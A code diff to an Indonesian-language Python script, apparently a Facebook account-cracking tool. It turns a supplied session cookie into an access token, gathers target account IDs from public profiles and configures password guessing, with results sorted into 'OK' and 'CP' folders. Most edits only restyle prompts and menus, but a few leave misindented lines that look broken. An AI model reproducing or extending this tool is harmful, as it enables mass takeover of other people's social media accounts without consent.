@@ -499,7 +499,7 @@ def back():
 	login()
 #------------------[ LOGO-LAKNAT ]-----------------#
 def banner():
-	    cetak(nel(f"""\x1b[1;91m
+	cetak(nel(f"""\x1b[1;91m
 \x1b[1;91m   .::!!!!!!!:.
 \x1b[1;91m      .!!!!!:.                      .:!!!!!!!!!!!!
 \x1b[1;91m      ~~~~!!!!!!.                 .:!!!!!!!!!UWWW$$$
@@ -531,8 +531,8 @@ def login():
 		login_lagi334()
 def login_lagi334():
 	try:
-		cetak(nel('DIREKOMENDASIKAN UNTUK MENGGUNAKAN COOKIE YG FRESS UNTUK CRACK AKUN',width=90,style=f"bold purple"))
-		your_cookies = input(' [+] MASUKKAN COOKIE ANDA : ')
+		cetak(nel('Disarankan Untuk Mengunakan Cookie Yg Masih Frehs Untuk Crack Akun',width=90,style=f"bold white"))
+		your_cookies = input(' [+] Cookie🍪 Anda : ')
 		with requests.Session() as r:
 			try:
 				r.headers.update({'content-type': 'application/x-www-form-urlencoded',})
@@ -544,7 +544,7 @@ def login_lagi334():
 				r.headers.update({'sec-fetch-mode': 'navigate','user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36','sec-fetch-site': 'cross-site','Host': 'm.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-dest': 'document',})
 				response2 = r.get(verification_url, cookies = {'cookie': your_cookies}).text
 				if 'HOW TO LOG IN YOUR FACEBOOK?' in str(response2) or '/login/?next=' in str(response2):
-					print(" [+] INVALID COOKIES...", end='\r');time.sleep(3.5);print("                     ", end='\r');exit()
+					print(" [+] Cookie🍪 Invalid", end='\r');time.sleep(3.5);print("                     ", end='\r');exit()
 				else:
 					action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
 					fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)
@@ -579,9 +579,9 @@ def login_lagi334():
 							print(f"\n [+] TOKEN : {access_token}")
 							tokenew = open(".token.txt","w").write(access_token)
 							cook= open(".cok.txt","w").write(your_cookies)
-							print("\n [+] LOGIN BERHASIL ULANGI PRINTAHNYA LAGI | python syah.py");exit()
+							print("\n [+] Login Berhasil Jalanin lagi Printahnya | python syah.py");exit()
 			except Exception as e:
-				print(" [+] COOKIE INVALID")
+				print(" [+] Cookie Invalid")
 				os.system('rm -rf .token.txt && rm -rf .cok.txt')
 				print(e)
 				time.sleep(3)
@@ -593,26 +593,22 @@ def menu(my_name,my_id):
 		token = open('.token.txt','r').read()
 		cok = open('.cok.txt','r').read()
 	except IOError:
-		print('[×]COOKIE KEDALUWARSA')
+		print('[×]Cookie Kadaluarsa')
 		time.sleep(5)
 		login_lagi334()
 	os.system('clear')
 	banner()
 	ip = requests.get("https://api.ipify.org").text
-	au='[-] AUTHOR : SYAH X FORCE\n[-] PERICODE : Zr-X\n[-]  '                                             
+	au='[-] Author : SYAH X FORCE\n[-] Pericode : Zr-X\n[-] Wa : 087753377394\n  '                                             
 	pengembang1=nel(au,style="cyan")
-	cetak(nel(pengembang1, title='[purple]AUTHOR INFORMATION'))
-	cetak(nel('SELAMAT DATANG : %s '%(my_name)))
-	cetak(nel('ID KAMU : '+str(my_id)))
-	print(f'╭──────────────────────────╮')
-	print(f'│ IP KAMU : {ip} │')
-	print(f'╰──────────────────────────╯')
-	au='[01] CRACK FACEBOOK\n[02] HASIL CRACK FACEBOOK\n[03] LOGOUT/HAPUS COOKIES'                                             
+	cetak(nel(pengembang1, title='[purple]INFORMASI AUTHOR DAN PERICODE'))
+	cetak(nel('Welcome : %s '%(my_name)))
+	cetak(nel('Idz : '+str(my_id)))
+	print(f'Ip : {ip} ')
+	au='[01] Crack Publik\n[02] Hasil Crack\n[03] Logout+Hapus Cookie'                                             
 	pengembang1=nel(au,style="cyan")
-	cetak(nel(pengembang1, title='[purple]METHODE'))
-	print('╭─────────────╮')
-	Ilman = input('\r│ [?] INPUT  │ : ')
-	print('╰─────────────╯')
+	cetak(nel(pengembang1, title='[purple]MENU CRACK'))
+	Ilman = input(f'\rINPUT : ')
 	if Ilman in ['1']:
 		dump_massal()
 	elif Ilman in ['2']:
@@ -620,7 +616,7 @@ def menu(my_name,my_id):
 	elif Ilman in ['3']:
 		os.system('rm -rf .token.txt')
 		os.system('rm -rf .cookie.txt')
-		print('[!] BERHASIL KELUAR/HAPUS COOKIE [!]')
+		print('[!] Berhasil Keluar+Hapus cookie [!]')
 		exit()
 	else:
 		print('[X] PILIH YANG BENAR WOI [X]')
@@ -634,10 +630,8 @@ def error():
 def result():
 	au='[01] HASIL OK\n[02] HASIL CP\n[03] KEMBALI'                                             
 	pengembang1=nel(au,style="cyan")
-	cetak(nel(pengembang1, title='[purple]RESULT'))
-	print('╭────────────╮')
-	kz = input(f'│ [?] INPUT │ : ')
-	print('╰────────────╯')
+	cetak(nel(pengembang1, title='[purple]HASIL CARACK'))
+	kz = input(f'INPUT : ')
 	if kz in ['2']:
 		try:vin = os.listdir('CP')
 		except FileNotFoundError:
@@ -739,12 +733,10 @@ def dump_massal():
 		exit()
 	try:
 		
-		au='[!] PASTIKAN ID TARGET PUBLIK [!]'
+		au='[!] Pastikan Idz Publik [!]'
 		pengembang1=nel(au,style="cyan")
-		cetak(nel(pengembang1, title='[purple][!] PERHATIAN  [!]'))
-		print('╭────────────────────────────╮')
-		jum = int(input('│[?] MAU BERAPA ID TARGET │ : '))
-		print('╰────────────────────────────╯')
+		cetak(nel(pengembang1, title='[purple]CARCK PUBLIK'))
+		jum = int(input('Mau Berapa Idz Target : '))
 	except ValueError:
 		print('[X] MASUKKAN ANGKA, BUKAN HURUF [X]')
 		exit()
@@ -755,9 +747,7 @@ def dump_massal():
 	yz = 0
 	for met in range(jum):
 		yz+=1
-		print('╭────────────────────╮')
-		kl = input(f'│[+] MASUKKAN ID TARGET │ '+str(yz)+ ' : ')
-		print('╰────────────────────╯')
+		kl = input(f'[+] Masukan Idz Target Ke '+str(yz)+ ' : ')
 		uid.append(kl)
 	for userr in uid:
 		try:
@@ -774,9 +764,7 @@ def dump_massal():
 			print('[X] JARINGAN TIDAK TERDETEKSI [X]')
 			exit()
 	try:
-		print(f'╭────────────────────╮')
-		print(f'│[+] TOTAL ID TERKUMPUL │ : '+str(len(id)))
-		print(f'╰────────────────────╯')
+		print(f' Total Idz Terkumpul : '+str(len(id)))
 		setting()
 	except requests.exceptions.ConnectionError:
 		print('[X] KONEKSI TIDAK TERDETEKSI [X]')
@@ -787,12 +775,10 @@ def dump_massal():
 		back()
 #-------------[ PENGATURAN-ID ]---------------#
 def setting():
-	au='[01] ID OLD\n[02] ID NEW\n[03] ID ACAK\n'
+	au='[01] OLD\n[02] NEW\n[03] ACAK\n'
 	pengembang1=nel(au,style="cyan")
-	cetak(nel(pengembang1, title='[purple]METHODE'))
-	print('╭───────────╮')
-	hu = input('│[?] INPUT │ : ')
-	print('╰───────────╯')
+	cetak(nel(pengembang1, title='[purple]OLD/NEW/ACAK'))
+	hu = input(' INPUT : ')
 	if hu in ['1','01']:
 		for tua in sorted(id):
 			id2.append(tua)
@@ -811,16 +797,14 @@ def setting():
 			xx = random.randint(0,len(id2))
 			id2.insert(xx,bacot)
 	else:
-		print('[X] SELECT THATS TRUE [X]')
+		print('[X] PILIH YG BENER [X]')
 		exit()
-	au='[01] MOBILE FACEBOOK\n[02] MBASIC FACEBOOK'
+	au='[01] MOBIL\n[02] BASIC\n'
 	pengembang1=nel(au,style="cyan")
 	cetak(nel(pengembang1, title='[purple]METHODE'))
 	###print('├──> 3. bbh  ')
 	###print('├──> 4. Mfreefb ')
-	print('╭───────────╮')
-	hc = input('│[?] INPUT │ : ')
-	print('╰───────────╯')
+	hc = input(' INPUT : ')
 	if hc in ['1','01']:
 		method.append('mobile')
 	elif hc in ['2','02']:
@@ -831,9 +815,9 @@ def setting():
 		method.append('mbasic')
 	else:
 		method.append('mobile')
-	print('╭────────────────────────╮')
-	_ilman_ = input('│[Y/T] TAMPILKAN APP? │ : ')
-	print('╰────────────────────────╯')
+		print('╭──────────────────────────────╮')
+	_ilman_ = input(' TAMPILKAN APP? Y/T : ')
+	    print('╰──────────────────────────────╯')
 	if _ilman_ in ['']:
 		print('[X] PILIH YG BENAR [X]')
 		back()
@@ -842,7 +826,7 @@ def setting():
 	else:
 		taplikasi.append('no')
 	print('╭─────────────────────────────────╮')
-	pwplus=input('│[Y/T] TAMBAHKAN PW MANUAL?│ : ')
+	pwplus=input(' TAMBAHKAN PW MANUAL? Y/T : ')
 	print('╰─────────────────────────────────╯')
 	if pwplus in ['y','Y']:
 		pwpluss.append('ya')
@@ -850,7 +834,7 @@ def setting():
 		pengembang1=nel(au,style="cyan")
 		cetak(nel(pengembang1, title='[purple][!] MASUKKAN PASSWORD MANUAL [!]'))
 		print('╭───────────────────────────╮')
-		pwku=input('│[?] PW MANUAL  │ : ')
+		pwku=input(' PW MANUAL : ')
 		print('╰───────────────────────────╯')
 		pwkuh=pwku.split(',')
 		for xpw in pwkuh:
@@ -1003,7 +987,8 @@ if __name__=='__main__':
 	except:pass
 	try:os.system('clear')
 	except:pass
-	ilman(f'\n\t {h}INI SC CRACK FB BY : Zr-X :>{x} ')
+	ilman(f'\n\t {h} [👉] SYAH X FORCE [👈]{x} ')
+	ilman(f'\n\t {h}     [💎] Zr-X [💎]{x} ')
 	time.sleep(5)
 	login()
 	
